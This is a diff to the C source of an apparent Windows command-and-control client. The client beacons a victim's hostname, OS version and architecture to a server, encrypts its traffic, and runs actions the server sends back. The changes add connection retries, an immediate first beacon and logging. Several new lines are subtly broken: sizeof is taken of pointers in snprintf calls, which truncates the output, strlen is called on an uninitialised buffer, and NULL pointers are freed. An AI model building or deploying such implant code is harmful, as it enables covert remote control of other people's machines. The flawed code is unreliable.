@@ -1,14 +1,32 @@
 #include "client.h"
 
-void log_it(const char* message) {
-    if (LOGGING && log_file) {
-        time_t now;
-        time(&now);
-        char* timestamp = ctime(&now);
-        timestamp[strlen(timestamp) - 1] = '\0'; // Remove newline
-        fprintf(log_file, "[%s] %s\n", timestamp, message);
-        fflush(log_file);
+void log_it(const char* format, ...) {
+    if (!LOGGING || !log_file) {
+        return;
     }
+
+    va_list args;
+    va_start(args, format);
+
+    time_t now;
+    time(&now);
+    char timestamp[26];
+    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
+
+    // Print timestamp
+    fprintf(log_file, "[%s] ", timestamp);
+
+    // Print the actual message
+    vfprintf(log_file, format, args);
+
+    // Add a newline if it's not already there
+    if (format[strlen(format) - 1] != '\n') {
+        fprintf(log_file, "\n");
+    }
+
+    fflush(log_file);
+
+    va_end(args);
 }
 
 char* get_session_id(const char* ip_address) {
@@ -26,16 +44,14 @@ char* get_session_id(const char* ip_address) {
         sum += atoi(ip_parts);
         ip_parts = strtok(NULL, ".");
     }
-    free(ip_copy);
-
     snprintf(data, sizeof(data), "%s<>%d", ip_address, sum);
     SHA256((unsigned char*)data, strlen(data), hash);
 
     for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
-        sprintf(&session_id[i*2], "%02x", hash[i]);
+        snprintf(&session_id[i*2], strlen(&session_id[i*2]), "%02x", hash[i]);
     }
     session_id[64] = '\0';
-
+    free(ip_copy);
     return session_id;
 }
 
@@ -128,13 +144,12 @@ char* encrypt_data(const char *data, const char *shared_key) {
 
     // Prepare the result string
     char *result = (char *)malloc(strlen(salt_b64) + strlen(iv_b64) + strlen(auth_tag_b64) + strlen(encrypted_data_b64) + 4);
-    sprintf(result, "%s:%s:%s:%s", salt_b64, iv_b64, auth_tag_b64, encrypted_data_b64);
+    snprintf(result, sizeof(result), "%s:%s:%s:%s", salt_b64, iv_b64, auth_tag_b64, encrypted_data_b64);
 
     free(salt_b64);
     free(iv_b64);
     free(auth_tag_b64);
     free(encrypted_data_b64);
-
     return result;
 }
 
@@ -271,15 +286,12 @@ void send_command(const char* response) {
             int result = send(client_socket, chunk, chunk_size, 0);
             if (result == SOCKET_ERROR) {
                 int error_code = WSAGetLastError();
-                fprintf(stderr, "Send failed with error: %d\n", error_code);
+                log_it("Send failed with error: %d\n", error_code);
                 free(encrypted);
                 return;
             }
 
-            // Log the sent chunk
-            char log_message[CHUNK_SIZE + 30]; // Adjust size as needed for logging
-            snprintf(log_message, sizeof(log_message), "Sent Chunk: %.*s", (int)chunk_size, chunk);
-            log_it(log_message);
+            log_it("Sent Chunk: %.*s", (int)chunk_size, chunk);
         }
     } else {
         // If the encrypted data fits in one chunk
@@ -292,11 +304,8 @@ void send_command(const char* response) {
         }
 
         // Log the sent data
-        char log_message[CHUNK_SIZE + 30]; // Adjust size as needed for logging
-        snprintf(log_message, sizeof(log_message), "Sent Data: %s", encrypted);
-        log_it(log_message);
+        log_it("Sent Data: %s", encrypted);
     }
-
     free(encrypted);
 }
 
@@ -314,28 +323,15 @@ void send_beacon() {
     GetComputerNameA(hostname, &size);
 
     // Prepare the beacon message
-    char buffer[CHUNK_SIZE];
+    char beacon[300];
     const char* beacon_format = "{\"response\": {\"beacon\": true,\"version\": \"%s\",\"type\": \"%s\",\"platform\": \"Windows\",\"arch\": \"%s\",\"osver\": \"%lu.%lu.%lu\",\"hostname\": \"%s\"}}";
+    const char* arch = sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86";
 
     // Format the beacon message into the buffer
-    int formatted_length = _snprintf_s(buffer, sizeof(buffer), _TRUNCATE,
-                                        beacon_format,
-                                        CVER, 
-                                        TYPE, 
-                                        sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
-                                        osInfo.dwMajorVersion, 
-                                        osInfo.dwMinorVersion, 
-                                        osInfo.dwBuildNumber,
-                                        hostname);
-
-    if (formatted_length < 0) {
-        // Handle formatting error
-        fprintf(stderr, "Formatting error occurred in send_beacon.\n");
-        return;
-    }
+    snprintf(beacon, sizeof(beacon), beacon_format, CVER, TYPE, arch, osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber, hostname);
 
     // Send the command with the formatted beacon message
-    send_command(buffer);
+    send_command(beacon);
 }
 
 void sleep_ms(int milliseconds) {
@@ -380,6 +376,9 @@ DWORD WINAPI beacon_interval_thread(LPVOID lpParam) {
 
 // Function to start beacon interval thread
 void start_beacon_interval() {
+    // send first beacon
+    send_beacon();
+
     CreateThread(NULL, 0, beacon_interval_thread, NULL, 0, NULL);
 }
 
@@ -456,13 +455,16 @@ char* format_file_name(const char* name, const char* extension) {
     char timestamp[20];
     char* file_name = malloc(100);  // Adjust size as needed
 
-    if (!file_name) return NULL;
+    if (!file_name) {
+        free(file_name);
+        return NULL;
+    }
 
     time(&now);
     localtime_s(&tm_info, &now);
     strftime(timestamp, 20, "%Y-%m-%d_%H-%M-%S", &tm_info);
 
-    snprintf(file_name, 100, "%s_%s.%s", name, timestamp, extension);
+    snprintf(file_name, sizeof(file_name), "%s_%s.%s", name, timestamp, extension);
     return file_name;
 }
 
@@ -475,9 +477,11 @@ char* format_time(long milliseconds) {
     int seconds = (int)(total_seconds % 60);
 
     char* formatted_time = malloc(50);  // Adjust size as needed
-    if (!formatted_time) return NULL;
-
-    snprintf(formatted_time, 50, "%dd %dh %dm %ds", days, hours, minutes, seconds);
+    if (!formatted_time) {
+        free(formatted_time);
+        return NULL;
+    }
+    snprintf(formatted_time, sizeof(formatted_time), "%dd %dh %dm %ds", days, hours, minutes, seconds);
     return formatted_time;
 }
 
@@ -535,8 +539,8 @@ void handle_connection() {
             char* decrypted = decrypt_data(buffer, SESSION_ID);
             if (decrypted) {
                 parse_action(decrypted);
-                free(decrypted);
             }
+            free(decrypted);
             ZeroMemory(buffer, 1024);
         } else if (valread == 0) {
             log_it("Server disconnected");
@@ -550,38 +554,58 @@ void handle_connection() {
 
 int connect_to_server() {
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        log_it("WSAStartup failed");
+    int iResult;
+    struct addrinfo *result = NULL, *ptr = NULL, hints;
+    char port_str[6];
+    int retry_count = 0;
+    const int max_retries = 3;
+
+    // Initialize Winsock
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        log_it("WSAStartup failed with error: %d", iResult);
         return -1;
     }
 
-    struct addrinfo *result = NULL, *ptr = NULL, hints;
     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    char port_str[6];
     snprintf(port_str, sizeof(port_str), "%d", SERVER_PORT);
 
-    if (getaddrinfo(SERVER_ADDRESS, port_str, &hints, &result) != 0) {
-        log_it("getaddrinfo failed");
+    // Resolve the server address and port
+    iResult = getaddrinfo(SERVER_ADDRESS, port_str, &hints, &result);
+    if (iResult != 0) {
+        log_it("getaddrinfo failed with error: %d", iResult);
         WSACleanup();
         return -1;
     }
 
+    // Attempt to connect to an address until one succeeds
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
+        // Create a SOCKET for connecting to server
         client_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
         if (client_socket == INVALID_SOCKET) {
-            log_it("Socket creation failed");
+            log_it("Socket creation failed with error: %ld", WSAGetLastError());
             freeaddrinfo(result);
             WSACleanup();
             return -1;
         }
 
-        if (connect(client_socket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
+        // Connect to server
+        iResult = connect(client_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
+        if (iResult == SOCKET_ERROR) {
             closesocket(client_socket);
             client_socket = INVALID_SOCKET;
+            retry_count++;
+            if (retry_count >= max_retries) {
+
+                log_it("Connect attempt %d failed", retry_count);
+                break;
+            }
+            log_it("Connect attempt %d failed, retrying...", retry_count);
+            Sleep(1000 * retry_count); // Exponential backoff
             continue;
         }
         break;
@@ -590,14 +614,30 @@ int connect_to_server() {
     freeaddrinfo(result);
 
     if (client_socket == INVALID_SOCKET) {
-        log_it("Unable to connect to server");
+        log_it("Unable to connect to server after %d attempts", max_retries);
         WSACleanup();
         return -1;
     }
 
-    log_it("Connected to server");
-    SESSION_ID = get_session_id(SERVER_ADDRESS);
-    send_beacon();
+    // Set receive timeout
+    DWORD timeout = 5000; // 5 seconds
+    setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+
+    log_it("Connected to server successfully");
+    
+    // Generate and store session ID
+    char* new_session_id = get_session_id(SERVER_ADDRESS);
+    if (new_session_id == NULL) {
+        log_it("Failed to generate session ID");
+        closesocket(client_socket);
+        WSACleanup();
+        return -1;
+    }
+    
+    if (SESSION_ID != NULL) {
+        free(SESSION_ID);
+    }
+    SESSION_ID = new_session_id;
 
     return 0;
 }
@@ -616,6 +656,7 @@ int main() {
             log_it("Failed to connect to server");
             sleep_ms(get_retry_interval(0));
         } else {
+            // Send initial beacon
             start_beacon_interval();
             handle_connection();
         }
